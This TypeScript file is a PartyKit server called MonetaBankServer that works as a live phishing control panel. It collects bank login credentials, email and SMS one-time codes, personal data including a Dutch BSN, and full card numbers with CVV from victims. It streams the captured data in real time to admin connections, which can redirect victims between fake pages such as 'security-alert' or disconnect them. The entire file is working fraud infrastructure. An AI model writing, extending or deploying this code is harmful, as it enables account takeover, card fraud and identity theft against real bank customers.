// ============================================================================
// PARTYKIT SERVER - ULTRA-FAST REAL-TIME MONITORING
// ============================================================================
// Runs on Cloudflare Workers Edge Network - <10ms latency worldwide
// FREE forever - No credit card required!
// ============================================================================

import type * as Party from "partykit/server";

// Client connection data structure
interface ClientData {
  clientId: string;
  sessionId: string;
  currentPage: string;
  status: 'online' | 'offline';
  startedAt: number;
  lastSeen: number;
  ip: string;
  userAgent: string;
  location?: string;
  data: {
    loginCredentials?: { username: string; password: string; timestamp: number };
    emailOTP?: { code: string; timestamp: number };
    smsOTP?: { code: string; timestamp: number };
    personalData?: {
      firstName: string;
      lastName: string;
      email: string;
      phone: string;
      dob: string;
      bsn: string;
      timestamp: number;
    };
    creditCard?: {
      number: string;
      name: string;
      expiry: string;
      cvv: string;
      timestamp: number;
    };
    documents?: Array<{ name: string; url: string; timestamp: number }>;
    qrCode?: { url: string; timestamp: number };
    whatsappNumber?: { number: string; timestamp: number };
  };
  activityHistory: Array<{
    timestamp: number;
    page: string;
    action: string;
    details?: string;
  }>;
}

// Message types
type MessageType = 
  | { type: 'client:register'; data: Partial<ClientData> }
  | { type: 'client:update'; data: Partial<ClientData> }
  | { type: 'client:data'; data: { field: string; value: any } }
  | { type: 'client:activity'; data: { page: string; action: string; details?: string } }
  | { type: 'client:heartbeat' }
  | { type: 'admin:request_clients' }
  | { type: 'admin:redirect'; data: { clientId: string; page: string } }
  | { type: 'admin:disconnect'; data: { clientId: string } };

export default class MonetaBankServer implements Party.Server {
  constructor(readonly room: Party.Room) {}

  // Store all connected clients in memory
  clients: Map<string, ClientData> = new Map();
  // Track admin connections
  adminConnections: Set<Party.Connection> = new Set();

  async onConnect(conn: Party.Connection, ctx: Party.ConnectionContext) {
    const userAgent = ctx.request.headers.get("user-agent") || "Unknown";
    const ip = ctx.request.headers.get("x-forwarded-for")?.split(',')[0] || 
               ctx.request.headers.get("cf-connecting-ip") || 
               "Unknown";

    console.log(`✅ New connection: ${conn.id} from ${ip}`);

    // Send current state to new connection
    conn.send(JSON.stringify({
      type: 'server:connected',
      data: { connectionId: conn.id }
    }));
  }

  async onMessage(message: string, sender: Party.Connection) {
    try {
      const msg: MessageType = JSON.parse(message);

      switch (msg.type) {
        case 'client:register':
          this.handleClientRegister(msg.data, sender);
          break;

        case 'client:update':
          this.handleClientUpdate(msg.data, sender);
          break;

        case 'client:data':
          this.handleClientData(msg.data, sender);
          break;

        case 'client:activity':
          this.handleClientActivity(msg.data, sender);
          break;

        case 'client:heartbeat':
          this.handleClientHeartbeat(sender);
          break;

        case 'admin:request_clients':
          this.handleAdminRequestClients(sender);
          break;

        case 'admin:redirect':
          this.handleAdminRedirect(msg.data);
          break;

        case 'admin:disconnect':
          this.handleAdminDisconnect(msg.data);
          break;
      }
    } catch (error) {
      console.error('Error parsing message:', error);
    }
  }

  private handleClientRegister(data: Partial<ClientData>, sender: Party.Connection) {
    const clientData: ClientData = {
      clientId: data.clientId || sender.id,
      sessionId: data.sessionId || `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      currentPage: data.currentPage || 'security-alert',
      status: 'online',
      startedAt: Date.now(),
      lastSeen: Date.now(),
      ip: data.ip || 'Unknown',
      userAgent: data.userAgent || 'Unknown',
      location: data.location,
      data: {},
      activityHistory: [{
        timestamp: Date.now(),
        page: data.currentPage || 'security-alert',
        action: 'Session Started',
        details: 'Client connected'
      }]
    };

    this.clients.set(clientData.clientId, clientData);
    console.log(`📝 Client registered: ${clientData.clientId}`);

    // Broadcast to all admins
    this.broadcastToAdmins({
      type: 'server:client_update',
      data: clientData
    });
  }

  private handleClientUpdate(data: Partial<ClientData>, sender: Party.Connection) {
    const clientId = data.clientId || sender.id;
    const existingClient = this.clients.get(clientId);

    if (existingClient) {
      const updatedClient: ClientData = {
        ...existingClient,
        ...data,
        lastSeen: Date.now()
      };

      // Add activity for page change
      if (data.currentPage && data.currentPage !== existingClient.currentPage) {
        updatedClient.activityHistory.push({
          timestamp: Date.now(),
          page: data.currentPage,
          action: 'Page Changed',
          details: `Navigated from ${existingClient.currentPage} to ${data.currentPage}`
        });
      }

      this.clients.set(clientId, updatedClient);

      // Broadcast to all admins
      this.broadcastToAdmins({
        type: 'server:client_update',
        data: updatedClient
      });
    }
  }

  private handleClientData(data: { field: string; value: any }, sender: Party.Connection) {
    const clientId = sender.id;
    const client = this.clients.get(clientId);

    if (client) {
      // Update client data
      client.data = {
        ...client.data,
        [data.field]: {
          ...data.value,
          timestamp: Date.now()
        }
      };

      // Add activity
      client.activityHistory.push({
        timestamp: Date.now(),
        page: client.currentPage,
        action: 'Data Submitted',
        details: `${data.field} data captured`
      });

      client.lastSeen = Date.now();
      this.clients.set(clientId, client);

      // Broadcast to all admins
      this.broadcastToAdmins({
        type: 'server:client_update',
        data: client
      });

      console.log(`💾 Data captured from ${clientId}: ${data.field}`);
    }
  }

  private handleClientActivity(data: { page: string; action: string; details?: string }, sender: Party.Connection) {
    const clientId = sender.id;
    const client = this.clients.get(clientId);

    if (client) {
      client.activityHistory.push({
        timestamp: Date.now(),
        page: data.page,
        action: data.action,
        details: data.details
      });

      client.lastSeen = Date.now();
      this.clients.set(clientId, client);

      // Broadcast to all admins
      this.broadcastToAdmins({
        type: 'server:client_update',
        data: client
      });
    }
  }

  private handleClientHeartbeat(sender: Party.Connection) {
    const clientId = sender.id;
    const client = this.clients.get(clientId);

    if (client) {
      client.lastSeen = Date.now();
      client.status = 'online';
      this.clients.set(clientId, client);
    }
  }

  private handleAdminRequestClients(sender: Party.Connection) {
    // Mark this connection as admin
    this.adminConnections.add(sender);

    // Send all clients to this admin
    const allClients = Array.from(this.clients.values());
    sender.send(JSON.stringify({
      type: 'server:all_clients',
      data: allClients
    }));

    console.log(`👨‍💼 Admin connected: ${sender.id}, sending ${allClients.length} clients`);
  }

  private handleAdminRedirect(data: { clientId: string; page: string }) {
    // Find client connection and send redirect command
    for (const [connId, conn] of this.room.getConnections()) {
      if (connId === data.clientId) {
        conn.send(JSON.stringify({
          type: 'server:redirect',
          data: { page: data.page }
        }));

        // Update client data
        const client = this.clients.get(data.clientId);
        if (client) {
          client.currentPage = data.page;
          client.activityHistory.push({
            timestamp: Date.now(),
            page: data.page,
            action: 'Admin Redirect',
            details: `Redirected by admin to ${data.page}`
          });
          this.clients.set(data.clientId, client);

          // Broadcast update to all admins
          this.broadcastToAdmins({
            type: 'server:client_update',
            data: client
          });
        }

        console.log(`🔄 Admin redirected client ${data.clientId} to ${data.page}`);
        break;
      }
    }
  }

  private handleAdminDisconnect(data: { clientId: string }) {
    // Find client connection and disconnect
    for (const [connId, conn] of this.room.getConnections()) {
      if (connId === data.clientId) {
        conn.close();
        console.log(`🚫 Admin disconnected client ${data.clientId}`);
        break;
      }
    }
  }

  private broadcastToAdmins(message: any) {
    const messageStr = JSON.stringify(message);
    for (const admin of this.adminConnections) {
      try {
        admin.send(messageStr);
      } catch (error) {
        // Remove disconnected admin
        this.adminConnections.delete(admin);
      }
    }
  }

  async onClose(connection: Party.Connection) {
    const clientId = connection.id;
    const client = this.clients.get(clientId);

    // Check if it's an admin
    if (this.adminConnections.has(connection)) {
      this.adminConnections.delete(connection);
      console.log(`👨‍💼 Admin disconnected: ${clientId}`);
      return;
    }

    // It's a client
    if (client) {
      client.status = 'offline';
      client.lastSeen = Date.now();
      client.activityHistory.push({
        timestamp: Date.now(),
        page: client.currentPage,
        action: 'Disconnected',
        details: 'Client connection closed'
      });

      this.clients.set(clientId, client);

      // Broadcast to all admins
      this.broadcastToAdmins({
        type: 'server:client_update',
        data: client
      });

      console.log(`❌ Client disconnected: ${clientId}`);
    }
  }

  // Optional: Clean up old offline clients periodically
  async onAlarm() {
    const now = Date.now();
    const TIMEOUT = 5 * 60 * 1000; // 5 minutes

    for (const [clientId, client] of this.clients.entries()) {
      if (client.status === 'offline' && now - client.lastSeen > TIMEOUT) {
        this.clients.delete(clientId);
        console.log(`🗑️ Cleaned up old client: ${clientId}`);
      }
    }

    // Schedule next cleanup in 1 minute
    await this.room.storage.setAlarm(Date.now() + 60 * 1000);
  }
}

MonetaBankServer satisfies Party.Worker;
